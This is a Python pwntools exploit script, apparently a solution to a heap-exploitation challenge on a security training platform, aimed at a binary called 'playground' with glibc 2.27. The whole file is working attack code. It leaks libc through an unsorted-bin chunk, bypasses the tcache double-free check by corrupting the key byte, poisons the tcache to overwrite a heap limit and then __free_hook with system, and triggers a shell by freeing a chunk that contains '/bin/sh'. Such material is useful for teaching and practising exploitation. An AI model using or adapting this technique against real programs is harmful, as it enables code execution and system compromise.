from pwn import *
import time


CHALL_PATH = "./playground_pathced"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.27.so")
COMMANDS = """
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("playground.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)


def alloc(c, size):
    c.recvuntil(b"> ")
    c.sendline(b"malloc " + str(size).encode())
    index = c.recvline().strip().split(b" ")[-1] # string of hex number
    index = int(index, 16)
    return index

def show(c, index, line, verbose=False):
    c.recvuntil(b"> ")
    c.sendline(b"show " + str(index).encode() + b" " + str(line).encode())
    data = []
    for i in range(line):
        data.append(c.recvline().strip())
    if verbose:
        print(data)
    return data

def free(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"free " + str(index).encode())
    c.recvuntil(b"==> ok\n")

def write(c, index, data):
    c.recvuntil(b"> ")
    c.sendline(b"write " + str(index).encode() + b" " + str(len(data)+1).encode())
    c.recvuntil(b"read\n")
    c.send(data)
    c.recvuntil(b"==> done\n")

# ------- max_heap address & value ----- 

pid = c.recvline()
main = int(c.recvline().strip().split(b" ")[-1], 16)
max_heap_addr = main + 0x2ec7
print("max_heap_addr: " + hex(max_heap_addr))
max_heap_value = int(show(c, max_heap_addr, 1)[0].split(b":")[-1].strip(),16)
print("max_heap_value: " + hex(max_heap_value))

# ------- Leak LIBC -----------

A = alloc(c, 0x500)  # too much for tcache -> unsorted bins when freed
B = alloc(c, 0x20)   # avoid consolidation with top chunk

free(c, A)
leak = show(c, A, 1)[0].split(b":")[-1].strip()
leak = int(leak,16)
LIBC.address = leak - 0x3ebca0
print("LIBC: " + hex(LIBC.address))

# ----------Double Free, must overwrite tcache key ------------

C = alloc(c, 0x20)
D = alloc(c, 0x20)

free(c, C)
write(c, C+0x8, b"A") # overwrite tcache key with one byte, enough to bypass check
free(c, C)

# ---------- Overwrite max_heap value ------------
E = alloc(c, 0x20)
write(c, E, p64(max_heap_addr))
# just to make max_heap_addr head of the list
F = alloc(c, 0x20)

G = alloc(c, 0x20)
write(c, G, p64(0x7fffffffffffffff)) # overwrite max_heap value with max value

# ---------- Overwrite __free_hook ------------

# Double Free:
# we need chunks of another size (0x30)
# because we already use 6/7 chunks of 0x20 in the tcache)
# like before we must overwrite tcache key to bypass double free protection
H = alloc(c, 0x30)
I = alloc(c, 0x30)

free(c, H)
write(c, H+0x8, b"A") # overwrite tcache key with one byte, enough to bypass check
free(c, H)

#---------- Overwrite __free_hook ------------
J = alloc(c, 0x30)
write(c, J, p64(LIBC.sym["__free_hook"]))
# just to make __free_hook head of the list
K = alloc(c, 0x30)

L = alloc(c, 0x30)
write(c, L, p64(LIBC.sym["system"])) 

# ---------- inject /bin/sh and trigger the system ------------


write(c, K, b"/bin/sh\x00")
c.recvuntil(b"> ")
c.sendline(b"free " + str(K).encode())



c.interactive()